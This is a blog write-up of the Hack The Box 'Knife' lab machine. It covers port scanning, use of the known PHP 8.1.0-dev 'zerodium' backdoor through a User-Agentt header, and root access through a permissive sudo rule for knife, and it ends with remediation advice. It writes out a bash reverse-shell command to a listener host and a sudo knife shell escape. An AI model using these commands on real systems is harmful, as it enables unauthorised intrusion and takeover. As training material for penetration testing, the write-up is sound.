<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Knife writeup" /><meta property="og:locale" content="en" /><meta name="description" content="In this post we explore the Knife machine hosted on the HackTheBox website. We first scan the machine to enumerate the open ports and the respective running services." /><meta property="og:description" content="In this post we explore the Knife machine hosted on the HackTheBox website. We first scan the machine to enumerate the open ports and the respective running services." /><link rel="canonical" href="https://martinotommasini.github.io/posts/Knife/" /><meta property="og:url" content="https://martinotommasini.github.io/posts/Knife/" /><meta property="og:site_name" content="Martino Tommasini" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-30T16:09:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Knife writeup" /><meta name="twitter:site" content="@tomatop_sec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"In this post we explore the Knife machine hosted on the HackTheBox website. We first scan the machine to enumerate the open ports and the respective running services.","url":"https://martinotommasini.github.io/posts/Knife/","@type":"BlogPosting","headline":"Hack The Box - Knife writeup","dateModified":"2021-09-19T23:20:56+02:00","datePublished":"2021-08-30T16:09:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://martinotommasini.github.io/posts/Knife/"},"@context":"https://schema.org"}</script><title>Hack The Box - Knife writeup | Martino Tommasini</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Martino Tommasini"><meta name="application-name" content="Martino Tommasini"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Martino Tommasini</a></div><div class="site-subtitle font-italic">InfoSec student | CTF player | Aspiring Penetration Tester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/MartinoTommasini" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/tomatop_sec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['martino.tommasini','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - Knife writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Knife writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Martino Tommasini </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Aug 30, 2021, 4:09 PM +0200" >Aug 30<i class="unloaded">2021-08-30T16:09:00+02:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 19, 2021, 11:20 PM +0200" >Sep 19<i class="unloaded">2021-09-19T23:20:56+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1280 words">7 min read</span></div></div><div class="post-content"> <img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/icon.webp" class="preview-img" alt="Knife image" ><p>In this post we explore the Knife machine hosted on the HackTheBox website. We first scan the machine to enumerate the open ports and the respective running services.</p><h3 id="analyze-and-discovery">Analyze and Discovery</h3><p>We start with an <code class="language-plaintext highlighter-rouge">nmap</code> enumeration. The <code class="language-plaintext highlighter-rouge">-sC</code> flag enables the usage of the default nmap scripts and the <code class="language-plaintext highlighter-rouge">-sV</code> flag enables the service and version discovery.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>&gt; nmap -sC -sV -oN nmap-initial 10.10.10.242

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 09:49 CEST
Nmap scan report for 10.10.10.242
Host is up (0.024s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds
</pre></table></code></div></div><p>Two ports results to be open: port 22 for the ssh service and 80 which hosts an Apache web service.</p><p>Visiting the webserver we land on the following page:</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/homepage.png" alt="" class="shadow" /></p></blockquote><p>The attack surface is very small as there aren’t any input fields nor clickable links. The tabs on the top right of the page are not actually implemented.</p><p>We can easily figure out that the website’s backend language is PHP by noticing that the landing page is called <code class="language-plaintext highlighter-rouge">index.php</code>. This information may be useful in the future to tailor our enumeration/attacks.</p><p>We can gather further information on the resources hosted on the webserver by enumerating files or directories served on port 80. For this purpose, we can use <code class="language-plaintext highlighter-rouge">gobuster</code> and perform a dictionary-based brute force enumeration. As we know that the web server is written in php, it may contain files ending with <code class="language-plaintext highlighter-rouge">.php</code>. It may be useful to tell <code class="language-plaintext highlighter-rouge">gobuster</code> to also append the <code class="language-plaintext highlighter-rouge">.php</code> extension to the dictionary entries. The <code class="language-plaintext highlighter-rouge">-x</code> flag enables such feature. The full <code class="language-plaintext highlighter-rouge">gobuster</code> command is</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster dir -u http://10.10.10.242 -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 50 -o gobuster-port80.txt
</pre></table></code></div></div><p>However the directory enumeration didn’t return any valuable results.</p><p>We can still examine the requests and responses generated when visiting the <code class="language-plaintext highlighter-rouge">index.php</code> page and see whether we can spot any anomalies.</p><p>We open the Firefox developer tools and navigate to the <code class="language-plaintext highlighter-rouge">Network</code> tab. Here we can see the request sent by the browser to the server to request the <code class="language-plaintext highlighter-rouge">index.php</code> page and its respective response.</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-095915.png" alt="" class="shadow" /></p></blockquote><p>The <code class="language-plaintext highlighter-rouge">X-Powered-By</code> HTTP response header leaks the <code class="language-plaintext highlighter-rouge">PHP</code> version in use</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-100046.png" alt="" class="shadow" /></p></blockquote><p>Now that we know the specific version of php used, namely <code class="language-plaintext highlighter-rouge">php 8.1.0-dev</code>, we can google for known vulnerabilities.<br /> Our search produced a very interesting result:</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-100432.png" alt="" class="shadow" /></p></blockquote><p>It confirms that the current version is vulnerable and contains a backdoor that may cause remote code execution. What we need to do is finding this backdoor and exploit it.</p><h3 id="insight-into-the-php-backdoor">Insight into the <code class="language-plaintext highlighter-rouge">PHP</code> backdoor</h3><p>In exploitDB we can find the reference to the malicious commit that introduced the backdoor in the PHP code base. (<a href="https://www.exploit-db.com/exploits/49933">ExploitDB</a>).</p><p>The backdoor is contained in the following code snippet:</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-101856.png" alt="" class="shadow" /></p></blockquote><p>As we can easily spot, the content of the <code class="language-plaintext highlighter-rouge">HTTP_USER_AGENTT</code> is scanned for the <code class="language-plaintext highlighter-rouge">zerodium</code> string. If the string is found, then the content after the first 8 bytes is evaluated.</p><p>So, if we build our <code class="language-plaintext highlighter-rouge">HTTP_USER_AGENTT</code> such that it starts with <code class="language-plaintext highlighter-rouge">zerodium</code> (8 bytes) than we will be able to execute the remaining bytes.</p><h3 id="attacking-and-tinkering">Attacking and Tinkering</h3><p>We know that the payload after the <code class="language-plaintext highlighter-rouge">zerodium</code> string will be executed in the server. Therefore we can embed a reverse shell to gain a shell in the remote machine.<br /> The server machine is running Ubuntu (as we can see from the <code class="language-plaintext highlighter-rouge">nmap</code> output), so we can use a simple tcp reverse shell that starts a connection to our local machine: <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.19/9001 0&gt;&amp;1</code>.<br /> (10.10.14.19 is the ip address of our local machine in the HTB network).</p><p>Indeed, we need to setup a tcp listener in our local machine to listen on port 9001 for the incoming connection. It can be done using netcat: <code class="language-plaintext highlighter-rouge">nc -lnvp 9001</code>.</p><p>The listener is ready, we can now trigger the backdoor.<br /> We embed our reverse shell into the <code class="language-plaintext highlighter-rouge">User-Agentt</code> header using BurpSuite.</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-102948.png" alt="" class="shadow" /></p></blockquote><p>And we get the callback</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-102850.png" alt="" class="shadow" /></p></blockquote><blockquote><p>An alternative to BurpSuite is the <code class="language-plaintext highlighter-rouge">curl</code> linux command. However, it would not be a very pleasant experience as one needs to pay close attention on escaping quotes.</p></blockquote><p>We now have a shell as the <strong>james</strong> user. We can get the user flag by printing the <code class="language-plaintext highlighter-rouge">/home/james/user.txt</code> file.</p><h4 id="privilege-escalation">Privilege Escalation</h4><p>We can scan the machine for possible privilege escalation vectors.</p><p>Before using any Linux enumeration scripts, we can try to see which commands the user <strong>james</strong> can execute as another user. It can be done using the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-103224.png" alt="" class="shadow" /></p></blockquote><p>As we can see from the command’s output, we can execute the <code class="language-plaintext highlighter-rouge">knife</code> binary as root without the need to provide a password.</p><p>But what is knife?</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-112124.png" alt="" class="shadow" /></p></blockquote><p>(More information on <a href="https://docs.chef.io/workstation/knife/">Chef Documentation website</a> )</p><p>The documentation is indeed a useful resource to look at. It may be possible to find exploit vectors.</p><p>As expected, going through the documentation highlighted an exploitable feature of the <code class="language-plaintext highlighter-rouge">knife</code> binary. It looks like we can execute arbitrary Ruby code:</p><blockquote><p><img data-proofer-ignore data-src="/assets/img/HackTheBox/Knife/20210605-105525.png" alt="" class="shadow" /></p></blockquote><p>Therefore we run the binary as <strong>root</strong> and spawn a shell using Ruby code.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>james@knife:/<span class="nv">$ </span><span class="nb">sudo </span>knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/bash"'</span>
<span class="nb">sudo </span>knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/bash"'</span>
<span class="nv">$ </span><span class="nb">whoami
</span>root
</pre></table></code></div></div><p>We managed to get <strong>root</strong>, flag is in <code class="language-plaintext highlighter-rouge">/root/root.txt</code></p><h3 id="reflection-on-the-security">Reflection on the security</h3><p>In this section we highlight the security weaknesses that allowed us to get full control over the remote server. Moreover, we propose solutions to mitigate and patch such vulnerabilities</p><h4 id="security-weaknesses-and-recommendations">Security weaknesses and recommendations</h4><ul><li><p>We managed to get a foothold in the target machine by exploiting an outdated version of PHP which contained a known backdoor. The vulnerability is extremely easy to exploit and allows an unauthenticated attacker to remotely gain access to the server’s OS. Given the high impact and easiness of exploitation, the vulnerability can be classified as high risk and should be immediately patched. <br /> We advice to always keep the software up to date. Publicly facing web servers should have high priority and be updated daily as they are the first point of entry to the machine.</p><li><p>The <code class="language-plaintext highlighter-rouge">X-Powered-By</code> leaks the PHP version in use, thus easily giving out extra information to the attacker. Such header should be immediately suppressed. Without the info about the PHP version the attacker would have had a harder time breaking into the machine. However security by obscurity is never a good solution and the problem should be fixed at the root (keep the software up to date).</p><li><p>We managed to escalate our privileges by exploiting an over permissive rule in the <code class="language-plaintext highlighter-rouge">sudoers</code> file. Such rule allowed the <code class="language-plaintext highlighter-rouge">james</code> user to execute the <code class="language-plaintext highlighter-rouge">knife</code> binary as root without the need of a password. Such configuration together with the large variety of features exposed by the binary, easily allow an attacker to gain full control over the machine. It is still unclear why the <code class="language-plaintext highlighter-rouge">sudoers</code> file contained such entry but it is definitely an over permissive rule which does not follow the minimality principle.<br /> It’s highly likely that the system administrator lazily set up the <code class="language-plaintext highlighter-rouge">knife</code> sudo permissions without taking security into account.<br /> In case the <strong>james</strong> user is required to execute part of the <code class="language-plaintext highlighter-rouge">knife</code> features, we advice to configure the <code class="language-plaintext highlighter-rouge">sudoers</code> file in a more granular way, giving the users access to the required features only, and only after an accurate analysis of such features.</p></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/machines/'>Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/known-exploit/" class="post-tag no-text-decoration" >known-exploit</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Knife writeup - Martino Tommasini&url=https://martinotommasini.github.io/posts/Knife/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Knife writeup - Martino Tommasini&u=https://martinotommasini.github.io/posts/Knife/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Knife writeup - Martino Tommasini&url=https://martinotommasini.github.io/posts/Knife/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Schooled/">Hack The Box - Schooled writeup</a><li><a href="/posts/TheNotebook/">Hack The Box - TheNotebook writeup</a><li><a href="/posts/Armageddon/">Hack The Box - Armageddon writeup</a><li><a href="/posts/Love/">Hack The Box - Love writeup</a><li><a href="/posts/ScriptKiddie/">Hack The Box - ScriptKiddie Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/known-exploit/">known-exploit</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/reflected-xss/">reflected-xss</a> <a class="post-tag" href="/tags/stored-xss/">stored-xss</a> <a class="post-tag" href="/tags/broken-access-control/">broken-access-control</a> <a class="post-tag" href="/tags/business-logic/">business-logic</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TheNotebook/"><div class="card-body"> <span class="timeago small" >Aug 3<i class="unloaded">2021-08-03T11:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - TheNotebook writeup</h3><div class="text-muted small"><p> Foothold We start with usual nmap enumeration $ nmap -sC -sV -oN nmap-initial 10.10.10.230 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 21:53 CEST Nmap scan report for 10.10.10.230 Host i...</p></div></div></a></div><div class="card"> <a href="/posts/Armageddon/"><div class="card-body"> <span class="timeago small" >Aug 3<i class="unloaded">2021-08-03T12:38:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Armageddon writeup</h3><div class="text-muted small"><p> Start with usual nmap enumeration &gt;&gt; nmap -sV -sC -oN nmap-initial 10.10.10.233 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb...</p></div></div></a></div><div class="card"> <a href="/posts/Love/"><div class="card-body"> <span class="timeago small" >Aug 17<i class="unloaded">2021-08-17T19:24:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Love writeup</h3><div class="text-muted small"><p> Start with usual nmap enumeration $ nmap -sC -sV -oN nmap-initial 10.10.10.239 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 17:42 CEST Nmap scan report for 10.10.10.239 Host is up (0.013s...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Love/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Love writeup</p></a> <a href="/posts/Schooled/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Schooled writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/tomatop_sec">Martino Tommasini</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/known-exploit/">known exploit</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/reflected-xss/">reflected xss</a> <a class="post-tag" href="/tags/stored-xss/">stored xss</a> <a class="post-tag" href="/tags/broken-access-control/">broken access control</a> <a class="post-tag" href="/tags/business-logic/">business logic</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://martinotommasini.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
